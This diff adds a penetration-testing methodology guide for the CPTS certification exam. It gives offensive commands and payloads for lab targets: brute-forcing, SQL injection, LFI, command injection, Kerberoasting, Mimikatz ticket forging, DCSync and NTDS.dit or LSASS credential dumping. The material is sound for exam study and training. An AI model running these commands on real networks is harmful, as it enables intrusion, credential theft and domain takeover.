@@ -1,0 +1,633 @@
+CPTS Exam Methodology Guide
+This guide provides a comprehensive, step-by-step methodology for tackling the entire CPTS exam process, from initial reconnaissance to final reporting. It is organized for easy note-taking in Obsidian or GitLab (using Markdown), with clear sections, command examples in code blocks, and expected outcomes at each stage. Use this playbook as a reference during CPTS exam preparation.
+1. Network Enumeration & Initial Foothold
+Network Reconnaissance (Nmap, Masscan, AutoRecon)
+Identify Targets: Begin by determining the IP range or specific hosts in scope. Use ping sweeps or ARP scans to find live hosts (e.g. nmap -sn 10.10.10.0/24). This ensures you focus scans on active systems.
+Port Scanning: Use Nmap for a thorough port scan:
+Start with a fast scan of common ports, then all ports if time permits. For example:
+bash
+Copy
+Edit
+# Quick scan top 1000 TCP ports with service detection
+nmap -sC -sV -T4 -Pn -oA initial_scan 10.10.10.0/24
+This runs default scripts (-sC) and version detection (-sV) on common ports. Expected output will list open ports, services, and versions for each host:
+plaintext
+Copy
+Edit
+Nmap scan report for 10.10.10.5
+Host is up.
+PORT    STATE SERVICE       VERSION
+80/tcp  open  http          Apache httpd 2.4.41
+445/tcp open  microsoft-ds  Windows 7 Professional 7601 SP1
+3389/tcp open  ms-wbt-server Microsoft Terminal Service
+If the network range is large, consider Masscan to quickly find open ports:
+bash
+Copy
+Edit
+sudo masscan 10.10.0.0/16 -p1-65535 -rate=10000 -oX masscan_output.xml
+Masscan’s output can guide which hosts/ports to examine with Nmap.
+Run targeted Nmap scans on results (including UDP ports if necessary). For UDP, use -sU with common ports (DNS, SNMP, etc.).
+Automated Recon Tools: Leverage tools like AutoRecon to automate enumeration. AutoRecon will run multiple scans and enumeration scripts for found services. Example usage:
+bash
+Copy
+Edit
+autorecon 10.10.10.5
+This creates an organized report (files for nmap results, service-specific outputs). Check these outputs for service versions, hostnames, and potential vulnerabilities.
+Expected Outcomes: A list of live hosts, open ports, and identified services on each target. By the end of recon, you should know which services to target for exploits (e.g. a web server on port 80, SMB on 445, etc.), and have saved scan results for reference.
+Web Enumeration (FFUF, Gobuster, WhatWeb, etc.)
+If a web service (HTTP/HTTPS) is discovered:
+Gather Info: Determine the web server and technologies: use whatweb or Wappalyzer to identify frameworks, languages, or CMS. For example:
+bash
+Copy
+Edit
+whatweb http://10.10.10.5
+Expected output: you might see details like HTTP server type, programming language, CMS, or JavaScript libraries (e.g. Apache version, PHP version, WordPress detected, etc.).
+Content Discovery: Use directory/file brute-forcing to find hidden pages or functionality:
+FFUF example:
+bash
+Copy
+Edit
+ffuf -u http://10.10.10.5/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.txt,.html -fc 404
+This will fuzz for common directories and files. The -fc 404 flag filters out 404 responses.
+Expected output: a list of discovered paths with status codes and sizes. For instance:
+plaintext
+Copy
+Edit
+adminpanel.php        [Status: 200, Size: 1024, Words: 50]
+uploads/              [Status: 301, Size: 0, Words: 1]
+Gobuster (alternative):
+bash
+Copy
+Edit
+gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/common.txt -x php,txt,html
+Check for Default Files: Manually try common filenames (robots.txt, sitemap.xml, admin, login, etc.). Sometimes these aren’t caught by wordlists but can be guessed.
+Web Service Specific Enum: If the site is running an application (e.g. WordPress, Joomla, etc.), use specialized tools or manual checks:
+For WordPress: wpscan --url http://10.10.10.5 --enumerate u (to enumerate users, plugins).
+For APIs: read documentation (if available) or intercept calls in Burp Suite to map endpoints.
+Expected Outcomes: A list of hidden pages, files, or directories (e.g. admin portals, backups, config files) and an understanding of the web application structure. Also, knowledge of the underlying tech stack (for example, knowing it’s a PHP site with Apache and maybe a specific framework).
+Credential Brute-Forcing (Hydra, Kerbrute, CrackMapExec)
+If no obvious exploit is found from service enumeration, consider brute-force or credential attacks:
+Hydra for Common Services: Use Hydra to brute-force logins on services like SSH, FTP, HTTP forms, etc.
+Example – brute-force SSH with a user list and password list:
+bash
+Copy
+Edit
+hydra -L users.txt -P passwords.txt ssh://10.10.10.5 -t 4
+Expected output: Hydra will report any valid credentials it finds, e.g.:
+plaintext
+Copy
+Edit
+[22][ssh] host: 10.10.10.5   login: **administrator**   password: **Winter2023**
+For web form brute-force, you must specify the form parameters and failure condition. For instance:
+bash
+Copy
+Edit
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.5 http-post-form "/login:username=^USER^&password=^PASS^:Invalid login"
+This attempts to log in as "admin" with many passwords, looking for a response that does not contain "Invalid login".
+Kerbrute for AD: If an Active Directory domain is identified, use kerbrute to enumerate valid usernames or brute-force passwords via Kerberos:
+bash
+Copy
+Edit
+# Enumerate valid usernames via Kerberos (no lockout risk for just user enumeration)
+kerbrute userenum -d EXAMPLE.LOCAL usernames.txt --dc 10.10.10.5
+Expected output: a list of discovered valid usernames (e.g. Administrator, jdoe, etc.). You can then attempt password spraying or brute force:
+bash
+Copy
+Edit
+kerbrute bruteuser -d EXAMPLE.LOCAL user1 passwords.txt --dc 10.10.10.5
+CrackMapExec (CME): CME is great for testing creds across multiple services at once (particularly SMB/WinRM in AD environments). For example:
+bash
+Copy
+Edit
+# Password spraying a common password across all users on an SMB network
+crackmapexec smb 10.10.10.0/24 -u users.txt -p 'Password123'
+Or use CME for pass-the-hash or checking shares:
+bash
+Copy
+Edit
+crackmapexec smb 10.10.10.5 -u Administrator -H <NTLM_hash> --shares
+Expected output: CME will indicate which logins succeed on which host, or list accessible shares if any.
+Expected Outcomes: Any discovered credentials or successful logins. For instance, you might obtain an SSH password, a valid web login, or an SMB credential. Even a low-privilege user can provide the initial foothold.
+Identifying and Exploiting Web Vulnerabilities (SQLi, LFI, RCE, etc.)
+When a web application is present, perform a thorough vulnerability assessment:
+SQL Injection (SQLi): Test input fields and URL parameters for SQL injection:
+Manually: Try entering ' OR '1'='1 in form fields or query params and observe responses. Error messages or anomalous behavior can indicate vulnerability.
+Use sqlmap for automation once you suspect SQLi:
+bash
+Copy
+Edit
+sqlmap -u "http://10.10.10.5/products.php?id=5" --batch --dbs
+Expected output: If vulnerable, sqlmap will identify the injection and list databases. For example:
+plaintext
+Copy
+Edit
+[*] available databases [2]:
+[*] information_schema
+[*] webshop
+You can then dump tables or extract credentials.
+Local File Inclusion (LFI): If you find file path parameters (e.g. page=home.php), try path traversal payloads:
+bash
+Copy
+Edit
+http://10.10.10.5/index.php?page=../../../../etc/passwd
+Expected outcome: If vulnerable, the contents of /etc/passwd (for Linux targets) or other files are displayed (e.g., seeing root:x:0:0:root:/root:/bin/bash). This can reveal usernames or even credentials (config files with passwords).
+Remote Code Execution (RCE): Look for places where you can inject OS commands:
+Common points are file uploads, form fields that might call system commands (e.g. ping forms, image upload). Try simple command separators: ;, &&, || in parameters.
+For example, a vulnerable parameter might allow:
+bash
+Copy
+Edit
+http://10.10.10.5/status?host=8.8.8.8;whoami
+Expected outcome: If the app directly uses the input in a shell command, the output may include the result of whoami (e.g. www-data).
+If file upload is allowed, attempt to upload a web shell (e.g. a PHP reverse shell) and access it. Ensure the file extension and content bypass filters (e.g., rename to .phtml if .php is blocked).
+Other Web Exploits:
+Cross-Site Scripting (XSS): Inject payloads like <script>alert(1)</script> in fields to see if they reflect in the page. While XSS might not directly give server access in an exam setting, it could lead to session hijacking if an admin user views it.
+Server-Side Request Forgery (SSRF): If the application fetches URLs (for example, an image proxy or PDF fetcher), try internal addresses (http://127.0.0.1:8080/ or cloud instance metadata URLs) to retrieve sensitive data.
+Authentication Bypass: Test if you can bypass logins via SQLi (as above) or logic flaws (e.g., manipulating session tokens or parameters). Try default credentials for admin pages (e.g. admin:admin, admin:password).
+For each vulnerability found, exploit it to gain a foothold or retrieve sensitive data:
+SQLi could yield credentials (which you then crack or reuse).
+LFI might allow reading config files (possibly containing passwords or keys).
+RCE gives the ability to spawn a reverse shell on the target server (use tools like nc or bash -i for reverse shell, or powershell -c on Windows).
+Expected Outcomes: One of these vulnerabilities should lead to an initial foothold, such as a low-privilege shell on a target machine or access to credential data. For example, exploiting an RCE might give a shell as a web user, or an SQL injection might leak an admin password that lets you SSH into the box.
+2. Web Application Testing Flow
+Once you have a foothold or if the exam presents a dedicated web application target, follow a systematic web testing methodology:
+Identifying Web Technologies
+Understanding the tech stack guides your testing:
+Banner Grabbing & Fingerprinting: Check HTTP response headers for server info (e.g. Server: Apache/2.4.41 (Ubuntu)). Use curl -I to fetch headers:
+bash
+Copy
+Edit
+curl -I http://10.10.10.5
+and note server and powered-by headers.
+WhatWeb/Wappalyzer: Use tools to enumerate frameworks, language, CMS, database, etc. For example, whatweb might reveal the site is built on ASP.NET with IIS or a specific JavaScript library. This helps guess likely vulnerabilities (e.g., an older PHP site might be prone to LFI or unserialize exploits).
+Source Inspection: View page source and JavaScript files. Look for comments, hidden fields, or references to APIs. Tech clues can also come from URLs (.jsp vs .php vs .aspx pages) or file structures.
+Record the identified technologies (e.g., “Running on Tomcat 9, Java backend, uses JWT for auth, and a MySQL database”).
+Testing for Common Web Vulnerabilities
+Follow a structured approach (often using the OWASP Top 10 as a guide):
+Injection Flaws: Test all forms, URL params, and headers for SQL injection, command injection, or LDAP injection. Use Burp Suite to intercept requests and test payloads systematically. If a parameter is numeric, try adding ' or ") to see if an error occurs. Use boolean conditions or time delays to test blind SQLi (e.g., ' OR SLEEP(5)--).
+Broken Authentication/Session: Check if you can bypass login or directly access privileged pages:
+Try forging or modifying cookies (e.g., change a role from user to admin in a cookie or JWT).
+Look for password reset functionalities that might be exploitable (like predictable tokens or insecure questions).
+Ensure session IDs change on login (to avoid fixation) and that you cannot reuse someone else's session ID if known.
+Cross-Site Scripting (XSS): Test any field that reflects input in the page (search boxes, profile fields, etc.). Both reflected and stored XSS are in scope. Use payloads that are likely to execute, such as:
+html
+Copy
+Edit
+<script>alert('XSS')</script>
+If the alert pops or you see your payload in the response without proper encoding, you found XSS.
+CSRF (Cross-Site Request Forgery): If the site has state-changing actions (like changing password), check if these requests can be made from a third-party site. Look for CSRF tokens in forms; absence indicates potential CSRF.
+File Upload Issues: If file upload is allowed, verify if the application restricts file types and executes any part of the file. Try uploading a text file and see where it goes. Then attempt a web shell file if possible. Also test for path traversal in file names (some poorly coded uploaders might allow ../ in the filename to write to unintended locations).
+SSRF and URL Access: If any functionality fetches a URL given by you (for example, an image proxy or web hook), attempt SSRF. Provide internal addresses or special URLs and see if you get a response. This could target internal services or cloud metadata (like AWS/Azure metadata URLs).
+Logic Flaws: Think about how the application is supposed to work and try to break assumptions:
+Can a standard user access an admin-only function by knowing the URL?
+Can you purchase an item for a negative price, or skip a payment step by forging a request?
+These require manual analysis of the app’s functionality.
+Use a combination of manual testing and automated scanners (like Burp Scanner or OWASP ZAP). Automated tools can quickly find obvious issues (SQLi, XSS, known vulnerable libs), while manual testing finds subtle logic or access control problems. Expected Outcome: A list of all vulnerabilities found in the web app. For each, document how to exploit it and what impact it has. Some vulnerabilities (like SQLi or auth bypass) might directly yield high-privilege access or sensitive data, which you will leverage moving forward.
+Exploiting JWT, API Vulnerabilities, and Authentication Bypasses
+Modern web apps often use JWTs and APIs:
+JWT (JSON Web Token) Attacks:
+Weak Signing Key: If the JWT is signed with HS256 (HMAC) and you suspect a weak secret, try brute-forcing the secret key (using tools like jwtcrack or Burp's JWT brute forcer). If you recover the signing key, you can forge tokens.
+alg=none Attack: Some implementations incorrectly allow alg: "none". You can modify a JWT header to "alg": "none" and remove the signature, then see if the server accepts it. A successful exploit might let you modify the payload (e.g., change your user role to admin) without needing a signature.
+Kid Parameter: Some JWTs use a kid header to fetch keys from a file or URL – this can lead to directory traversal or SSRF if not secured.
+Once you can forge JWTs, create an admin token by changing the payload {"role":"admin"} or similar, then sign with the known key to impersonate high-privilege users.
+API Vulnerabilities:
+Insecure Direct Object References (IDOR): If the API uses predictable IDs (like /api/users/123), test accessing resources you shouldn’t (e.g., another user’s ID). Lack of proper authorization checks can expose or modify data across accounts.
+Missing Authentication: Test all API endpoints; sometimes internal APIs are left unprotected. For instance, an /api/admin/ endpoint might be accessible without a valid token or with a token from a normal user.
+Rate Limiting: If the API has login or one-time codes, test if you can brute-force due to missing rate limits.
+Use tools like Postman or Burp to iterate through API calls and analyze responses. Fuzz parameters with intruder/ffuf for hidden API parameters or endpoints.
+Authentication Bypasses:
+Default Credentials: Always try common default creds for web apps or appliances (e.g., admin:admin, admin:password, etc.).
+SQLi in Login: As noted, an SQL injection on a login form can often bypass auth (' OR 1=1-- as password, etc.). If the application shows any SQL error or unusual behavior on login attempt, explore this vector.
+Logic Flaw in Auth: e.g., an app might email a reset link with a predictable token or user ID – try manipulating those. Or perhaps you can register with a privileged email domain to get admin by default.
+OAuth/OpenID issues: If the app uses SSO, check for parameter manipulation like redirect_uri (for leaking tokens) or id_token tampering.
+Expected Outcome: Elevated access within the web application. For instance, forging a JWT might let you access admin APIs; an IDOR might expose all users’ data. These can provide credentials or footholds to other systems. You should end this phase with all web application vulnerabilities enumerated and at least one critical exploit path (like admin access or remote code execution) identified.
+Manual vs Automated Testing
+Use a balanced approach for efficiency and depth:
+Manual Testing: Essential for understanding application logic and finding creative flaws. Manually step through the application as different user roles if possible, map out functionality, and think like a developer and a malicious user. This finds issues that scanners cannot (e.g., a multi-step workflow bypass).
+Automated Tools: Utilize scanners to catch known vulnerabilities and misconfigurations quickly:
+Run tools like Burp Suite Active Scan or OWASP ZAP on the target. They can find SQLi, XSS, missing security headers, etc. more quickly for broad coverage.
+Use nikto or Nuclei for quick checks of known CVEs or config issues in web servers.
+Keep automation results as a supplement. Verify any finding manually to eliminate false positives and confirm impact.
+When to Use Which: Start manual recon to get a feel for the app, then run automated scans to ensure you didn't miss low-hanging fruit. After that, focus manually on areas scanners flagged or that seem likely vulnerable. For example, a scanner might not figure out that a certain parameter is vulnerable to SSRF – a human observation (like noticing an endpoint fetching a URL) is needed.
+Key Point: Automation saves time on large attack surfaces, but manual testing is crucial for complex vulnerabilities. In an exam (and real-world), use automation to augment your capabilities, not to replace them. Document both automated findings and manual exploit steps for reporting.
+3. Active Directory Attacks & Post-Kerberoasting Steps
+Many CPTS exam environments include an Active Directory domain. After obtaining an initial foothold (e.g., a web server or workstation in the domain), focus on enumerating and attacking AD.
+Initial AD Enumeration (BloodHound, PowerView, CrackMapExec)
+Once you have a shell in the AD environment (likely as a domain user or on a domain-joined machine):
+Host Recon: Collect basic info from the current machine:
+whoami /all (Windows) to see your user and privileges.
+ipconfig /all to identify domain name and other domain controllers or networks.
+net config Workstation or set USERDOMAIN to get the domain name.
+net user /domain to list domain users; net group "Domain Admins" /domain to list members of important groups.
+BloodHound: A crucial tool for mapping AD relationships. If you can run executables, use SharpHound (BloodHound data collector):
+powershell
+Copy
+Edit
+.\SharpHound.exe -c All -d <DOMAIN_NAME> -CompressData -encryptZip
+This collects AD info (users, groups, ACLs, SPNs, sessions, etc.). Transfer the generated ZIP file off the target and load it into the BloodHound GUI on your system. Analyze for paths to high privilege (e.g., find if the compromised user has a path to Domain Admin via group membership, ACL on an object, etc.).
+PowerView (if PowerShell is available and you can import scripts): Use PowerView.ps1 for AD queries:
+List users: Get-DomainUser -Verbose (and look for interesting properties like PasswordNotRequired, AdminCount).
+Find users with SPN (service accounts for kerberoasting):
+powershell
+Copy
+Edit
+Get-DomainUser -SPN | select SamAccountName, ServicePrincipalName
+List groups and memberships: Get-DomainGroup "Domain Admins" -Recurse.
+Find current domain controller: Get-DomainController.
+Search for sensitive info: Find-InterestingDomainShare or Invoke-ShareFinder (to find shared folders).
+CrackMapExec (AD usage): CME can quickly check many things in AD:
+Validate credentials on many hosts: crackmapexec smb 10.10.20.0/24 -u <user> -p <pass> will tell you where that user has access (and if any host says admin access).
+Enumerate SMB shares anonymously or with creds: crackmapexec smb 10.10.20.5 -u '' -p '' --shares ('' for anonymous).
+Check for LDAP signing, SMB signing configurations which might be exploitable (CME flags these).
+Native Commands: Even without special tools, built-in commands help:
+nltest /domain_trusts /all_trusts to see trust relationships (if multiple domains).
+schtasks /query /S <hostname> /V to see scheduled tasks on remote machine (if creds allow).
+wmic qfe (quick patch enumeration, maybe hints at missing patches if older OS — potential kernel exploit targets).
+Expected Outcomes: A clear picture of the AD environment:
+Domain structure (user accounts, groups, computers).
+Identification of potential attack paths or interesting targets (e.g., user accounts that might be exploitable, or machines where your current account has higher privileges).
+Especially note any service accounts (users with SPN, which implies kerberoastable) and accounts with no preauth required (for AS-REP roast). Also note if your foothold user is in any privileged groups or has local admin on any other machine (CME can reveal that).
+Kerberoasting & AS-REP Roasting Attack Chains
+Armed with domain user access, target Kerberos to extract credential material:
+Kerberoasting: This attack targets service accounts in AD. Any user can request a Kerberos service ticket (TGS) for services with an SPN, and the ticket is encrypted with the service account’s password hash. Steps:
+Identify accounts with SPN set. (Using PowerView’s Get-DomainUser -SPN or the tool GetUserSPNs.py from Impacket.)
+Use Impacket on your attacker machine if you have credentials (or run a tool on the compromised host) to request service tickets:
+bash
+Copy
+Edit
+impacket-GetUserSPNs 'EXAMPLE.local/username:Password123' -dc-ip 10.10.20.5 -request
+This will list service principal names and output hashes (Kerberos TGS tickets in hash form).
+Expected output: One or more lines with $krb5tgs$23$*<account>*:<hash> format, indicating an encrypted ticket for that account.
+If you cannot use impacket on target, use a PowerShell script like Invoke-Kerberoast (from PowerView/PowerShell Empire modules) or Rubeus:
+powershell
+Copy
+Edit
+# Using Rubeus on Windows to Kerberoast all SPNs
+.\Rubeus.exe kerberoast /format:hashcat /outfile:kerberoast.txt
+This will save hashcat-formatted hashes of any SPNs the current user can query.
+AS-REP Roasting: Targets user accounts with “Do not require Kerberos preauthentication” set (often service accounts or legacy accounts). Any attacker can request an AS-REP (initial TGT) for such a user without credentials:
+Use Impacket's GetNPUsers.py:
+bash
+Copy
+Edit
+impacket-GetNPUsers EXAMPLE.local/ -usersfile users.txt -no-pass -dc-ip 10.10.20.5
+(If you have a list of potential users or from domain enumeration, this will return AS-REP hashes for accounts with no preauth.)
+Or use PowerView:
+powershell
+Copy
+Edit
+Get-DomainUser -PreauthNotRequired -Verbose
+Then feed those usernames to GetNPUsers or Rubeus:
+powershell
+Copy
+Edit
+.\Rubeus.exe asreproast /user:legacyService /format:hashcat
+Expected output: Hashes in format $krb5asrep$<details> which can be cracked offline.
+Cracking Kerberos Hashes: Once you have TGS or AS-REP hashes, crack them offline:
+Use hashcat on your machine. For TGS (Kerberoast) hashes use mode 13100, for AS-REP use mode 18200. Example for Kerberoast:
+bash
+Copy
+Edit
+hashcat -m 13100 -a 0 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
+Monitor hashcat’s output for cracked passwords. Alternatively, use John the Ripper with john --format=krb5tgs or krb5asrep.
+A successful crack gives the plaintext password of the service account. For example: you might crack and find SQLService: Password123!.
+If the password is not cracked with a wordlist, you may need to try rules or larger dictionaries. In exam time, focus on likely wordlists (Rockyou is a good start).
+Expected Outcomes: One or more passwords for domain accounts obtained by cracking Kerberos tickets. At minimum, you’ll retrieve an NTLM hash that you might use in pass-the-hash attacks if cracking fails. Ideally, you now have credentials for a service account (which often has more privileges than a regular user). For instance, you might get the password for an account SQLService which could be a local admin on a database server, or even a member of privileged AD group.
+Post-Kerberoasting Steps
+Now that you have some hashes or passwords from Kerberos attacks, plan your next moves: Decrypt & Analyze TGS Tickets: (Meaning: crack the hash and understand what you got)
+If you cracked a service account password, determine that account’s privileges:
+Is it a member of any admin groups? (net user SQLService /domain to check group membership.)
+Does it have local admin rights on any machine? (Use CME or BloodHound queries: BloodHound "Local Admins" query can show where this account is admin.)
+Log in with the credentials on appropriate services. For example, if it’s a service for MSSQL, try connecting to the database using those creds. Or attempt WinRM/SMB login on various servers using the new credentials.
+What to do next after extracting hashes:
+Pass-the-Hash (PtH): If you obtained NTLM hashes but not plaintext (or even if you have plaintext, PtH can be quicker in some cases), you can use the hash directly to authenticate to machines that accept NTLM:
+Example: Using Evil-WinRM (for WinRM) with a hash:
+bash
+Copy
+Edit
+evil-winrm -i 10.10.20.8 -u Administrator -H <NTLM_hash>
+If that host accepts the hash and the user is an admin on it, you get a shell without needing the plaintext password.
+Or with crackmapexec: cme smb <targetIP> -u Administrator -H <hash> -x "whoami" to execute a command via SMB with that hash.
+Note: Ensure you specify LM hash if needed (format <LM>:<NTLM>; use empty LM if not given).
+Over-Pass-the-Hash (Pass the Key): This is useful if Kerberos is enforced or to pivot to Kerberos authentication​
+TARLOGIC.COM
+. With the NTLM hash of a user, you can request a valid Kerberos TGT for that user​
+TARLOGIC.COM
+:
+On Windows, Mimikatz does this via sekurlsa::pth (pass the hash to get a Kerberos ticket).
+On Linux, use Impacket’s getTGT.py:
+bash
+Copy
+Edit
+getTGT.py EXAMPLE.local/username -hashes :<NTLM_hash> -dc-ip 10.10.20.5
+This saves a .ccache file (Kerberos ticket). You can then use other impacket tools with -k -no-pass (using the cached ticket) to perform actions as that user.
+This essentially logs you in as that user in the domain without knowing the plaintext password, avoiding NTLM logons if disabled.
+Silver Ticket: If you have obtained the NTLM hash of a service account that corresponds to a service running on a machine (for example, the machine’s computer account, or a service like MSSQL on a server), you can craft a silver ticket. A silver ticket is a forged service ticket (TGS) for a specific service on a specific machine, created using the service account’s hash​
+TARLOGIC.COM
+. This lets you authenticate to that service with arbitrary privileges:
+Using Mimikatz on a Windows host you control:
+text
+Copy
+Edit
+kerberos::golden /domain:EXAMPLE.local /sid:<domain SID> /target:SERVER01 /service:cifs /rc4:<NTLM_hash> /user:Administrator /ptt
+Despite the command name "golden", specifying a service (like cifs for SMB or HTTP for web) and an account’s RC4 (NTLM) hash effectively creates a Silver Ticket for that service. This example would forge a ticket granting Administrator access to SMB (CIFS) on SERVER01 using the machine account hash of SERVER01.
+After /ptt (pass-the-ticket), that fake ticket is injected in your Kerberos cache. You can then, for instance, map a drive to \\SERVER01\C$ or use psexec to get a shell on that server as system, because the server believes you're an authenticated admin for the SMB service​
+TARLOGIC.COM
+.
+Important: Silver tickets don’t touch the DC, so they might not trigger detection quickly. But they only work for the service you forge; you cannot use a silver ticket for universal access (unlike golden tickets which require the KRBTGT hash).
+Privilege Escalation & Lateral Movement in AD:
+Now with new credentials or administrative access on some machine, pivot further. For example, if SQLService was just a SQL DB service but happens to be local admin on the DB server, use it to log into that DB server. On that server, look for ways to escalate (maybe the DB server has a Domain Admin logged in – you can harvest their token or credentials from memory).
+Use mimikatz on any machine where you have local admin to dump credentials from memory:
+Run Invoke-Mimikatz (PowerShell) or execute mimikatz binary to do sekurlsa::logonpasswords or sekurlsa::ekeys to get credentials of logged-in users. Often, Domain Admins may log into servers; grabbing their creds = domain takeover.
+Use procdump as an alternative: procdump -accepteula -ma lsass.exe lsass.dmp (dump LSASS memory) and download it to analyze with mimikatz on your machine (this avoids some live detection).
+If you find domain admin credentials, you can proceed to fully compromise the domain (dump NTDS.dit, etc. – see below).
+If not yet domain admin, continue enumerating: maybe the service account you cracked has some delegated privileges. For instance, check if it has rights like GenericAll on some AD object (BloodHound will show this). You might be able to reset passwords or add group membership using that account’s rights (for example, it might have full control over an OU).
+Lateral movement: Use the credentials you have to access other machines:
+wmiexec.py or psexec.py (Impacket) with the creds to get shells on other systems.
+WinRM (evil-winrm) if the host has it enabled.
+RDP into servers if allowed (less common in exam due to setup).
+Once on new machines, repeat local enumeration and privilege escalation to see if that machine holds something valuable.
+At this stage, you might compromise a key server (e.g., a backup server, or the domain controller itself if you now have DA credentials). Aim to escalate to Domain Admin privileges if possible, as that grants full control. Expected Outcomes: You should now be in possession of one or more of:
+Domain admin credentials (or at least an account with DCSync rights or similar high privileges).
+Administrator access to multiple hosts in the network.
+In the best case, complete control of the AD domain.
+Even if you haven’t popped the Domain Controller early, having several privileged accounts can be enough to get all flags required. But typically, domain dominance (and dumping the NTDS.dit) is a final goal.
+Credential Abuse Techniques (Pass-the-Hash, DCSync, Mimikatz, NTDS.dit Extraction)
+With high privileges (e.g., local admin on DC or actual Domain Admin rights), you can employ powerful techniques to harvest remaining credentials and prove full compromise:
+Pass-the-Hash (PtH): Already discussed for lateral movement, but as an ongoing technique: any NTLM hash obtained (e.g., from dumping SAM or LSASS) can be used to impersonate that user on other machines without cracking it. This is especially useful for accounts with long, complex passwords that you won't bother cracking if you have the hash. Tools like Mimikatz allow injecting hashes into your current session (sekurlsa::pth), or use CME/Impacket as shown.
+DCSync Attack: This abuses the replication feature of AD. If you have domain admin or an account with the Replicating Directory Changes permissions (e.g., DS-Replication-Get-Changes on the domain), you can pull credentials from the Domain Controller without touching the disk. Essentially, you pretend to be a DC and ask another DC for user password data​
+TARLOGIC.COM
+.
+Using Mimikatz on a DC or a system with domain connectivity:
+text
+Copy
+Edit
+mimikatz.exe "lsadump::dcsync /domain:EXAMPLE.local /user:Administrator" exit
+This will output the NTLM and possibly LM hash for the Administrator account (or whatever account you specify). You can do this for krbtgt account as well, which is needed for a golden ticket.
+Using Impacket from your machine:
+bash
+Copy
+Edit
+secretsdump.py EXAMPLE.local/Administrator:Password@DC_IP
+(If you have Administrator creds or NTLM hash, this will DCSync all users by default). It dumps all the hashes from AD, similar to dumping the NTDS.dit.
+Expected output: Hashes of many accounts, including administrators, krbtgt, etc.​
+TARLOGIC.COM
+. Now you have the “keys to the kingdom” – every user’s password hash.
+Mimikatz for Tickets and Vault: With DA access, mimikatz can do more:
+Golden Ticket: If you have the krbtgt hash (from DCSync or NTDS dump), you can forge a Golden Ticket. This grants you domain admin access for any service in the domain​
+TARLOGIC.COM
+​
+TARLOGIC.COM
+. In practice, at this point it's just another way to maintain access; you might not need to actually use one in the exam if you already have DA. But it’s good to mention in methodology:
+text
+Copy
+Edit
+kerberos::golden /domain:EXAMPLE.local /sid:<domainSID> /krbtgt:<krbtgt_hash> /user:MasterChief /id:500 /ptt
+This creates and injects a ticket as "MasterChief" with RID 500 (Administrator) – effectively giving you Domain Admin rights that last until the ticket expires (you can set far future expiry if desired).
+Extract plaintext passwords: sekurlsa::logonpasswords can sometimes pull plaintext or DPAPI secrets if any are stored (e.g., for services or scheduled tasks).
+Dump credential manager vault or LSADUMP secrets (which might have auto-logon creds or server account creds).
+NTDS.dit Extraction: The nuclear option for credential harvesting. NTDS.dit is the AD database containing all domain user password hashes.
+If you have admin on a DC, you can dump NTDS.dit file (and the SYSTEM registry hive for the key) to extract all hashes offline. Ways to do this:
+Use ntdsutil on the DC to create a snapshot and copy NTDS.dit.
+Use Volume Shadow Copy:
+powershell
+Copy
+Edit
+ntdsutil "ac i ntds" "ifm" "create full c:\temp\ntdsdump" quit quit
+This creates an IFM dump in c:\temp\ntdsdump with NTDS.dit and required files. Or
+powershell
+Copy
+Edit
+vssadmin create shadow /for=C:
+# find the shadow copy device path from output, then:
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\NTDS.dit
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM
+Then transfer those files and use secretsdump.py locally:
+bash
+Copy
+Edit
+secretsdump.py -ntds NTDS.dit -system SYSTEM LOCAL -outputfile ntdsdump.txt
+This will yield all domain hashes (same result as DCSync but via offline method).
+In many cases, DCSync via secretsdump.py is simpler if you already have admin creds, as shown above, so you may choose that over manually handling NTDS.dit.
+Pivot to Other Forests or Systems: If the environment has multiple domains (trusts) or external systems, use extracted creds to access those as well. (This might be beyond exam scope unless specified.)
+By this point, you should have every credential or at least sufficient privileges to access all machines in the network. This completes the exploitation phase with complete control of the environment. Expected Outcomes: Dump of all critical credentials (Administrator, krbtgt hash, all user hashes). For exam purposes, this confirms you have thoroughly compromised the network. Also, you’ve likely collected all the flags in the environment by visiting each machine with the creds obtained.
+4. Lateral Movement & Privilege Escalation (Linux & Windows)
+Throughout the engagement, you will need to escalate privileges on individual machines (to go from a user to root/System) and pivot between machines and networks. This section covers common techniques for Windows and Linux privilege escalation, as well as pivoting/tunneling to reach internal systems.
+Windows Privilege Escalation
+After getting a low-privilege shell on a Windows host (say as a standard user or service account), check for these common escalation vectors:
+Weak Service Permissions: Many Windows services run as SYSTEM. If the executable or its configuration is modifiable by your user, you can replace it or change settings to execute your payload:
+Enumerate services and their file paths and permissions. Tools like WinPEAS or accesschk can automate this. Manually, use PowerShell or sc qc:
+bash
+Copy
+Edit
+sc qc VulnService
+sc sdshow VulnService    # shows service DACL
+If your user has write access to the binary (path in BINPATH), you can swap it with a malicious one and restart the service.
+Unquoted Service Paths: Services with spaces in their path not enclosed in quotes can be exploited. E.g., a service configured to run C:\Program Files\App Name\Service.exe without quotes can attempt to execute C:\Program.exe if it exists (due to how Windows parses paths). If you can create C:\Program.exe (and your user can write to C:), it will run as SYSTEM on service start.
+List services with unquoted paths:
+bash
+Copy
+Edit
+wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows"
+Look for paths with spaces and no quotes in the output. If the path before a space is writable to you, you have a path hijack opportunity.
+DLL Hijacking: When applications or services run, they may look for DLLs in their working directory before system paths. If a service runs as SYSTEM and tries to load a DLL that isn’t present, and if you can write a malicious DLL to that directory with the expected name, you gain SYSTEM on service start.
+Tools like ProcMon can help find missing DLL issues, but in CTF/exam, often an intended DLL hijack will be documented in something or found by WinPEAS.
+For example, a service might load C:\Program Files\App\libs\foo.dll which doesn’t exist. If you can write to C:\Program Files\App\libs\, place your foo.dll (with a reverse shell payload) there and restart the service.
+Token Impersonation: If your account has the privilege SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege enabled (common for service accounts like IIS app pools), you can perform token impersonation attacks. This is abusing a privilege where you can impersonate tokens of other processes:
+The classic exploitation is with Potato attacks (JuicyPotato, RoguePotato, PrintSpoofer) which trick a service into connecting to a fake resource and capturing a SYSTEM token.
